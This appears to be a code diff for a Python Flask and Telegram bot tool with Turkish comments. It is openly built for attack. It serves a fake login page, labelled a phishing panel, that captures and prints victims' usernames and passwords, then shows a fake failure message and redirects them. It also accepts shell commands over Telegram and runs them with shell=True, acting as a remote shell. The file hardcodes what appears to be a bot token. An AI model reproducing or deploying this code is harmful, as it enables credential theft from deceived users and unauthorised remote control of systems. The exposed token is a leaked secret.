@@ -3,19 +3,19 @@ import subprocess
 import requests
 from flask import Flask, request, render_template_string
 import telebot
-import threading
 
 TOKEN = "8265368924:AAHwCmS8esD_UzOJsJmEqb_HbOepWdELKCA"
 bot = telebot.TeleBot(TOKEN, threaded=False)
 app = Flask(__name__)
 
-RENDER_URL = "https://ulti-eqn5.onrender.com"
+# Render Güncel URL'niz
+RENDER_URL = "https://bd-wpu1.onrender.com"
 
-# Webhook'u otomatik ayarla
+# Webhook ayarı
 bot.remove_webhook()
 bot.set_webhook(url=f"{RENDER_URL}/{TOKEN}")
 
-# --- WEB & PHISHING PANELİ ---
+# --- 1. WEB & PHISHING PANELİ ---
 PHISHING_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -46,7 +46,7 @@ PHISHING_TEMPLATE = """
 
 @app.route("/", methods=["GET"])
 def index():
-    return "[+] Bot & Web Panel Aktif ve Çalışıyor."
+    return "[+] Bot & Web Panel Aktif."
 
 @app.route("/panel", methods=["GET"])
 def phishing_page():
@@ -59,6 +59,7 @@ def capture_credentials():
     print(f"[!] YAKALANAN BİLGİ -> Kullanıcı: {user} | Şifre: {pwd}")
     return "<h3>Giriş başarısız, lütfen tekrar deneyin.</h3><script>setTimeout(function(){window.location.href='/panel';}, 3000);</script>"
 
+# Webhook Alıcısı
 @app.route(f"/{TOKEN}", methods=["POST"])
 def webhook():
     if request.headers.get('content-type') == 'application/json':
@@ -70,7 +71,7 @@ def webhook():
         return '', 403
 
 
-# --- TELEGRAM BOT KOMUTLARI ---
+# --- 2. TELEGRAM BOT KOMUTLARI VE MENÜ ---
 
 @bot.message_handler(commands=['start', 'help', 'menu'])
 def send_welcome(message):
@@ -98,7 +99,11 @@ def handle_shell(message):
         return
 
     try:
-        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10)
+        output = subprocess.run(
+            command, shell=True,
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+            text=True, timeout=10
+        )
         result = output.stdout + output.stderr
         if not result:
             result = "İşlem tamamlandı, çıktı üretmedi."
